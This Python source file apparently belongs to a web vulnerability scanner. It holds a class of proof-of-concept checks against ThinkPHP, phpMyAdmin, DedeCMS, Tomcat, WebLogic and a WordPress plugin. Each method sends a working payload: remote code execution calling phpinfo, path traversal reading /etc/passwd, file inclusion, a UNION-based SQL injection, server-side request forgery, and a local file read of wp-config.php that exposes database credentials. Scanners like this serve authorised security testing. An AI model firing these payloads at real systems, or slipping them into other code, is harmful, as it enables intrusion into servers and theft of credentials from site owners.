import re
import requests
from core.requester import requester
from core.log import factory_logger,time
from core.colors import red,end


class middleware_vulne:

    def __init__(self,url,logger_type,middleware_info = None,middleware_type = None):

        self.url = url
        self._dic = middleware_info
        self.target = url
        self.logger_type = logger_type
        self.logger = factory_logger(logger_type,url,"poc")
        self.middleware_type = middleware_type

        self.midd_dic = {

                         "thinkphp" : self.thinkphp_RCE_CVE_2018_5955,
                         "phpmyadmin" : self.phpmyadmin_CVE_2018_12613,
                         "dedecms" : (self.dedecms_file_inclusion,self.dedecms_membergroup_sqli),
                         "tomcat" : self.tomcat_cve_2018_11759,
                         "weblogic" : self.weblogic_ssrf,
                         "wordpress" : self.wordpress_lfi

                         }


    def thinkphp_RCE_CVE_2018_5955(self):
        print(f"")

        url = self.url + r'/index.php?s=/Index/\think\app/invokefunction&function=' \
                     r'call_user_func_array&vars[0]=phpinfo&vars[1][]=-1'
        try:
            response = requester(url, data = None, GET = True, timeout = 5)
            if response.status_code == 500 and 'PHP' in response.text and 'System' in response.text:
                self.logger.critical(
                                     f"url : {url}\n"
                                     f"Thinkphp_RCE_CVE_2018_5955 exists !\n"
                                    )
        except Exception:
            self.logger_= factory_logger(self.logger_type, self.target, "poc not found")
            self.logger_.info("Thinkphp_RCE_CVE_2018_5955 not found !")



    def phpmyadmin_CVE_2018_12613(self):
        url = self.url + r'/index.php?target=db_sql.php%253f/../../../../../../../../etc/passwd'

        try:
            response = requests.get(url, timeout = 5)
            if response.status_code == 200 and re.match(r'root:[x*]:0:0:', response.text,re.I):
                self.logger.critical(
                    f"url : {url}\n"
                    f"Phpmyadmin_CVE_2018_12613 exists !\n"
                )
        except Exception:
            self.logger_ = factory_logger(self.logger_type, self.target, "poc not found")
            self.logger_.info("Phpmyadmin_CVE_2018_12613 not found !")


    def dedecms_file_inclusion(self):
        url = self.url + r'/plus/carbuyaction.php?dopost=return&code=../../'

        try:
            response = requests.get(url, timeout = 5)
            if response.status_code == 200:
                self.logger.critical(
                    f"url : {url}\n"
                    f"Dedecms_file_inclusion exists !\n"
                )

        except Exception:
            self.logger_ = factory_logger(self.logger_type, self.target, "poc not found")
            self.logger_.info("Dedecms_file_inclusion not found !")

    def dedecms_membergroup_sqli(self):
        url = self.url + "/member/ajax_membergroup.php?action=post&membergroup=@`'`/*!50000Union+*/+/*!50000select+*/+123456789+--+@`'`"

        try:
            response = requests.get(url,timeout = 5)
            if response.status_code == 200 and "123456789" in response.text:
                self.logger.critical(
                    f"url : {url}\n"
                    f"Dedecms_membergroup_sqli exists !\n"
                )
        except Exception:
            self.logger_ = factory_logger(self.logger_type, self.target, "poc not found")
            self.logger_.info("Dedecms_membergroup_sqli not found !")

    def tomcat_cve_2018_11759(self):
        url = self.url + "/jkstatus;?cmd=dump"

        try:
            response = requests.get(url,timeout = 5)
            if response.status_code == 200 and "ServerRoot=*" in response.text:
                self.logger.critical(
                    f"url : {url}\n"
                    f"Tomcat_cve_2018_11759 exists !\n"
                )
        except Exception:
            self.logger_ = factory_logger(self.logger_type, self.target, "poc not found")
            self.logger_.info("Tomcat_cve_2018_11759 not found !")

    def weblogic_ssrf(self):
        url = self.url + "/uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search&operator=http://127.1.1.1:700"

        try:
            response = requests.get(url,timeout = 5)
            if response.status_code == 200 and "&#39;127.1.1.1&#39" in response.text or "Socket Closed" in response.text:
                self.logger.critical(
                    f"url : {url}\n"
                    f"Weblogic_ssrf exists !\n"
                )
        except Exception:
            self.logger_ = factory_logger(self.logger_type, self.target, "poc not found")
            self.logger_.info("Weblogic ssrf not found !")

    def wordpress_lfi(self):
        url = self.url + "/wp-content/plugins/adaptive-images/adaptive-images-script.php?adaptive-images-settings[source_file]=../../../wp-config.php"
        try:
            response = requests.get(url,timeout = 5)
            if response.status_code == 200 and "DB_NAME" in response.text and "DB_USER" in response.text and "DB_PASSWORD" in response.text:
                self.logger.critical(
                    f"url : {url}\n"
                    f"Wordpress Local file include exists !\n"
                )

        except:
            self.logger_ = factory_logger(self.logger_type, self.target, "poc not found")
            self.logger_.info("Wordpress Local file include not found !")


    def analyse(self):
        if not self._dic is None:
            for key,value in self._dic.items():
                if value.lower() in self.midd_dic.values():
                    self.midd_dic[key]()


        if not self.middleware_type is None:
            if self.middleware_type.lower() in self.midd_dic.keys():
                self.midd_dic[self.middleware_type]()






